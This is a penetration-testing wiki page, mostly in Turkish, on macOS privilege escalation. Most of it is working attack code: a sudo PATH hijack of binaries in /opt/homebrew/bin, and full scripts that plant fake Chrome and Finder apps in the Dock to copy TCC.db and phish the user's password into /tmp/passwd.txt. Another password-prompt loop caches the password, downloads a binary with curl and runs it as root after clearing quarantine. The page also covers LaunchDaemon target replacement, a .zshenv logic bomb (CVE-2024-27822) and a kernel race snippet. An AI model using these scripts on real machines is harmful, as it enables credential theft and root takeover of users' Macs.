# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation arıyorsanız şuraya gidin:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Linux veya Unix benzeri diğer sistemleri etkileyen birçok privilege-escalation tekniği macOS için de geçerlidir. Bkz.:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Orijinal [Sudo Hijacking tekniğini Linux Privilege Escalation gönderisinde](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) bulabilirsiniz.

Ancak macOS, kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`** değerini **korur**. Bu, bu saldırıyı gerçekleştirmenin başka bir yolunun, kurbanın **sudo çalıştırırken:** yürütmeye devam edeceği **diğer binary'leri hijack etmek** olacağı anlamına gelir:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Terminal kullanan bir kullanıcının **Homebrew installed** olma ihtimali oldukça yüksektir. Bu nedenle **`/opt/homebrew/bin`** içindeki binary'leri hijack etmek mümkündür.

### Dock Impersonation

Bir miktar **social engineering** kullanarak Dock içinde örneğin **Google Chrome**'u **impersonate** edebilir ve aslında kendi script'inizi çalıştırabilirsiniz:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Bazı öneriler:

- Dock'ta Chrome olup olmadığını kontrol edin; varsa bu öğeyi **remove** edin ve **fake** **Chrome entry**'yi Dock array'inde **aynı position**'a **add** edin.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Bazı öneriler:

- **Finder'ı Dock'tan kaldıramazsınız**, bu nedenle onu Dock'a ekleyecekseniz sahte Finder'ı gerçek Finder'ın hemen yanına yerleştirebilirsiniz. Bunun için **sahte Finder girdisini Dock dizisinin başına eklemeniz** gerekir.
- Başka bir seçenek de onu Dock'a yerleştirmeden yalnızca açmaktır; "Finder, Finder'ı denetlemek istiyor" ifadesi o kadar da garip değildir.
- Korkunç bir kutuyla parola sormadan **root'a yükselmenin** başka bir seçeneği, Finder'ın ayrıcalıklı bir işlem gerçekleştirmek için gerçekten parola istemesini sağlamaktır:
- Finder'dan yeni bir **`sudo`** dosyasını **`/etc/pam.d`** konumuna kopyalamasını isteyin (Parola isteyen istem, "Finder sudo'yu kopyalamak istiyor" ifadesini gösterecektir.)
- Yeni bir **Authorization Plugin** kopyalamasını Finder'dan isteyin (Dosya adını kontrol edebilirsiniz; böylece parola isteyen istem, "Finder Finder.bundle'u kopyalamak istiyor" ifadesini gösterecektir.)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Parola istemi phishing + sudo yeniden kullanımı

Malware, **sudo yetkili bir parolayı ele geçirmek** ve bunu programatik olarak yeniden kullanmak için kullanıcı etkileşimini sıklıkla kötüye kullanır. Yaygın bir akış:

1. `whoami` ile oturum açmış kullanıcıyı belirleyin.
2. `dscl . -authonly "$user" "$pw"` başarılı olana kadar **parola istemlerini döngüye alın**.
3. Kimlik bilgisini önbelleğe alın (ör. `/tmp/.pass`) ve ayrıcalıklı işlemleri `sudo -S` (stdin üzerinden parola) ile gerçekleştirin.

Örnek minimal zincir:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Çalınan parola daha sonra **Gatekeeper quarantine'ı `xattr -c` ile clear etmek**, LaunchDaemons veya diğer ayrıcalıklı dosyaları kopyalamak ve ek aşamaları etkileşimsiz olarak çalıştırmak için yeniden kullanılabilir.<sup>[[1]](#references)</sup>

## Yeni macOS'e özgü vektörler (2023–2026)

### Deprecated `AuthorizationExecuteWithPrivileges` hâlâ kullanılabilir

`AuthorizationExecuteWithPrivileges`, 10.7'de deprecated edildi ancak **Sonoma/Sequoia'da hâlâ çalışıyor**. Birçok ticari updater, güvenilmeyen bir path ile `/usr/libexec/security_authtrampoline` çağırır. Hedef binary kullanıcı tarafından yazılabilirse bir trojan yerleştirip meşru prompt'tan yararlanabilirsiniz:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combine with the **masquerading tricks above** to present a believable password dialog.


### Privileged helper / XPC triage

Modern third-party macOS privescs'lerin çoğu aynı pattern'i izler: bir **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** üzerinden bir **Mach/XPC service** sunar; ardından helper ya **client'ı doğrulamaz**, **çok geç doğrular** (PID race) veya **user-controlled path/script** kullanan bir **root method** sunar. Bu, VPN client'ları, game launcher'ları ve updater'larda yakın zamanda ortaya çıkan birçok helper bug'ının arkasındaki bug class'tır.<sup>[[2]](#references)</sup>

Hızlı triage kontrol listesi:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Şunlara özellikle dikkat edin:

- İş **`launchd`** içinde yüklü kaldığı için **kaldırma işleminden sonra** istekleri kabul etmeye devam eden helper'lar
- **`/Applications/...`** veya root olmayan kullanıcılar tarafından yazılabilir diğer yollardan script çalıştıran ya da configuration okuyan helper'lar
- Race condition'a açık olabilecek **PID tabanlı** veya **yalnızca bundle-id tabanlı** peer validation kullanan helper'lar

Helper authorization bug'ları hakkında daha fazla bilgi için [bu sayfaya](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) bakın.

### PackageKit script environment inheritance (CVE-2024-27822)

Apple bunu **Sonoma 14.5**, **Ventura 13.6.7** ve **Monterey 12.7.5** sürümlerinde düzeltene kadar, **`Installer.app`** / **`PackageKit.framework`** üzerinden kullanıcı tarafından başlatılan install işlemleri, **PKG script'lerini mevcut kullanıcının environment'ı içinde root olarak** çalıştırabiliyordu. Bu, **`#!/bin/zsh`** kullanan bir package'ın saldırganın **`~/.zshenv`** dosyasını yükleyip victim package'ı yüklediğinde bunu **root olarak** çalıştırabilmesi anlamına geliyordu.<sup>[[3]](#references)</sup>

Bu durum özellikle bir **logic bomb** olarak ilgi çekicidir: Kullanıcının hesabında bir foothold ve yazılabilir bir shell startup file'ı elde etmeniz yeterlidir; ardından kullanıcı tarafından herhangi bir vulnerable **zsh tabanlı** installer'ın çalıştırılmasını beklersiniz. Bu durum genel olarak **MDM/Munki** deployment'ları için geçerli değildir; çünkü bunlar root kullanıcının environment'ı içinde çalışır.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Daha derinlemesine installer-specific abuse incelemesi için [bu sayfaya](macos-files-folders-and-binaries/macos-installers-abuse.md) da bakın.

### `.localized` üzerinden installer hedef çakışması

Bazı third-party installer'lar, executable'ı `/Applications/Target.app` içindeki sabit bir path ile referanslandırılan bir root LaunchDaemon kaydeder. Bir attacker bu bundle'ı önce **farklı bir bundle identifier** ile oluşturabilirse Installer decoy'u koruyabilir ve gerçek app'i `/Applications/Target.localized/Target.app` konumuna yerleştirebilir. Daemon yine de original path'i gösterir. Bu nedenle decoy bundle içindeki attacker-controlled executable daha sonra root olarak çalışabilir.<sup>[[8]](#references)</sup>

Önemli ön koşullar şunlardır:<sup>[[8]](#references)</sup>

1. Attacker'ın beklenen application path'ini oluşturabilmesi veya kontrol edebilmesi.
2. Package'ın çakışan bundle'ı kaldırmaması.
3. Privileged job'ın bu bundle içinde hard-coded bir path kullanması.
4. Kullanıcının veya bir MDM workflow'unun package'ı yüklemesi ve job'ı kaydetmesi.

Relocated bundle'ları arayın ve ardından sonraki bölümdeki enumeration loop ile LaunchDaemon target'larını inceleyin:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Daha güvenli bir installer, nihai bundle konumunu çözümler ve ayrıcalıklı executable'ları `/Library/PrivilegedHelperTools` gibi root tarafından sahip olunan bir konumda tutar. Ayrıca job'ı kaydetmeden veya başlatmadan önce sahipliği ve code signing durumunu doğrulamalıdır.<sup>[[8]](#references)</sup>

### Yazılabilir LaunchDaemon hedef ele geçirme

Bir LaunchDaemon plist'i root tarafından sahip olunabilir; ancak `Program` veya ilk `ProgramArguments` girdisi kullanıcı tarafından yazılabilir bir dizine işaret edebilir. Yalnızca executable izinlerini değil, **tüm yolu** kontrol edin. Üst dizin yazılabilirse saldırgan, root tarafından sahip olunan bir executable'ı yeniden adlandırabilir ve aynı yolda bir replacement oluşturabilir. Replacement, job bir sonraki başlatıldığında root olarak çalışır. Bir reboot veya normal bir service restart yeterlidir. Saldırganın system domain içinde `launchctl bootstrap` çalıştırma iznine ihtiyacı yoktur.<sup>[[7]](#references)</sup>

Önce her hedefi ve doğrudan üst dizinini listeleyin:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Dosya veya üst dizini yazılabilir olduğunda, orijinal binary'yi koruyun ve yolu executable payload ile değiştirin. Ardından zaten yüklenmiş daemon'un yeniden başlatılmasını bekleyin.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Savunmasız `kauth_cred_proc_update` yolu, SMR okuyucuları pointer'ı kilit olmadan yüklerken `proc_ro.p_ucred` değerini atomik olmayan `zalloc_ro_mut` API'siyle güncelliyordu. Public trigger, özel olarak hazırlanmış bir setgid binary kullanır. Bir thread gerçek ve effective group ID'leri arasında geçiş yaparken başka bir thread sürekli olarak `getgid()` gibi bir syscall'a girer.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Bunu hazır bir root exploit'i olarak değil, bir **race primitive** olarak değerlendirin. Yayınlanan PoC, bölünmüş bir credential pointer gösterir. Genellikle kernel panic ile sonuçlanır. Araştırmacı bozulmayı yalnızca Intel üzerinde yeniden üretti ve ortaya çıkan credential object üzerinde deterministik kontrol sağlamadı. Apple, macOS 15.3'te güncellemeyi atomic pointer exchange olarak değiştirdi.<sup>[[4]](#references)</sup>

### Migration Assistant üzerinden SIP bypass ("Migraine", CVE-2023-32369)

Zaten root yetkiniz olsa bile SIP, sistem konumlarına yazmayı engeller. **Migraine** bug'ı, SIP bypass'ını devralan ve korunan path'lerin (ör. `/System/Library/LaunchDaemons`) üzerine yazan bir child process başlatmak için Migration Assistant entitlement'ı olan `com.apple.rootless.install.heritable` değerini kötüye kullanır.<sup>[[5]](#references)</sup> Saldırı zinciri:

1. Çalışan bir sistemde root elde edin.
2. Saldırganın kontrolündeki bir binary'yi çalıştırması için `systemmigrationd`'yi hazırlanmış state ile tetikleyin.
3. SIP tarafından korunan dosyaları değiştirmek ve reboot sonrasında bile kalıcılık sağlamak için devralınan entitlement'ı kullanın.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Birden fazla Apple daemon'ı XPC üzerinden **NSPredicate** object'lerini kabul eder ve yalnızca saldırganın kontrolündeki `expressionType` field'ını doğrular. Arbitrary selector'ları değerlendiren bir predicate oluşturarak **root/system XPC service'lerinde code execution** elde edebilirsiniz (ör. `coreduetd`, `contextstored`). Bu durum, initial app sandbox escape ile birleştirildiğinde **user prompt'ları olmadan privilege escalation** sağlar. Predicate'leri deserialize eden ve sağlam bir visitor içermeyen XPC endpoint'lerini arayın.<sup>[[6]](#references)</sup>

## TCC - Root Yetki Yükseltme

### CVE-2020-9771 - mount_apfs TCC bypass ve privilege escalation

**Herhangi bir user** (unprivileged user'lar dâhil), `-o noowners` ile bir Time Machine snapshot'ı oluşturup mount edebilir ve **snapshot'taki TÜM dosyalara erişebilir**; böylece live volume üzerindeki ownership kontrollerini bypass eder. Gereken tek privilege, kullanılan application'ın (ör. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) yetkisine sahip olmasıdır.

Komutlar ve tüm açıklama TCC bypasses sayfasındadır:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Hassas Bilgiler

Bu, privilege escalation için faydalı olabilir:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: macOS için AWS Client VPN Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS ve iOS'ta Yeni Bir Privilege Escalation Bug Class](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: güvensiz folder permission'ları üzerinden privilege escalation ve persistence](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [`.localized` directory üzerinden macOS LPE](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
